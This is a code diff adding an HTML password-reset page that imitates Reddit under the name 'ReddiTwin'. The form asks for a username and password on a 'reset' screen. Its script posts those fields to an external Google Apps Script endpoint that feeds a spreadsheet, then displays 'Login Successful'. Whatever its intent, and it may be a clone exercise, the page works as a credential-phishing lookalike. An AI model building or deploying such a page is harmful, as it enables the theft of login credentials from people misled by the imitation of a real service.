@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Metadata -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="resetpasswoed.css">
+    <!-- Preconnect for fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+</head>
+<body>
+    <!-- Reddit Login Section -->
+    <div class="Reddit">
+        <h1 class="nano">Reset your password</h1>
+        <h4 class="nano" style="font-weight: 100;">
+            Tell us the username and email address associated with your ReddiTwin account, and we’ll send you an email with a link to reset your password.
+        </h4>
+        <!-- Google and Apple Login Options -->
+        <form name="submit-to-google-sheet">
+            <div class="google-apple">
+                <a href="https://accounts.google.com">
+                    <div class="google">
+                        <img src="images/google-.png" alt="Google image">
+                        <p>Continue with Google</p>
+                    </div>
+                </a>
+                <a href="https://appleid.apple.com">
+                    <div class="google">
+                        <img id="red1" src="images/apple.png" alt="Apple">
+                        <p id="red">Continue with Apple</p>
+                    </div>
+                </a>
+            </div>
+            
+            <h3 class="heading">OR</h3>
+            <!-- Username and Password Inputs -->
+            <div class="textbox">
+                <label class="pro" for="Username"></label>
+                <input class="user" type="text" name="Username" placeholder="Username" required="required" id="us1" onfocus="up()" onblur="down()">
+            </div>
+            <br/>
+
+            <label class="pro" for="Password"></label>
+            <input class="user" type="password" name="Password" placeholder="Password" required="required" onfocus="up1()" onblur="down1()" id="pass1">
+
+            <br/>
+
+            <!-- Forgot Username/Password Links -->
+            <p class="nano">Forgot your <a class="top" href="/resetusername/reset username.html">username</a>?</p>
+
+            <!-- Log In Button -->
+            <button id="cable">Reset password</button>
+            
+        </form>
+        <!-- Success Message -->
+        <p id="msg">Login Successful</p>
+        <!-- Sign Up Link -->
+        <h class="tat">Don't have an email or need assistance logging in? <a class="tat" href="gethelp.html">Get Help</a></h>
+        <br>
+        <a class="tat" href="/signup/Signup.html">Sign Up</a> . <a class="tat" href="/login/login.html">Log In</a>
+        </br>
+    </div>
+
+    <!-- JavaScript for Placeholder Animation -->
+    <script>
+        // Placeholder animation functions
+        function up() {
+            const ty = document.getElementById("us1");
+            ty.classList.add("pl");
+        }
+        
+        function down() {
+            const py = document.getElementById("us1");
+            py.classList.remove("pl");
+        }
+        
+        function up1() {
+            const ty = document.getElementById("pass1");
+            ty.classList.add("pl");
+        }
+        
+        function down1() {
+            const py = document.getElementById("pass1");
+            py.classList.remove("pl");
+        }
+    </script>
+    
+    <!-- JavaScript for Form Submission -->
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyKUguqM_3t_qqz7JgMFeRej5wo4gM0ziQ2k7LuedMxb_czzi3R2T890a0PGNCxoLgOyQ/exec';
+        const form = document.forms['submit-to-google-sheet'];
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            const msg = document.getElementById('msg'); // Get the msg element
+
+            // Your existing code for form submission
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => {
+                    // Display success message
+                    msg.style.display = "block"; // Set display to "block"
+
+                    // Reset message and form after a delay
+                    setTimeout(function() {
+                        msg.style.display = "none"; // Set display back to "none"
+                        form.reset();
+                    }, 1000);
+                })
+                .catch(error => console.error('Error!', error.message))
+        });
+    </script>
+</body>
+</html>
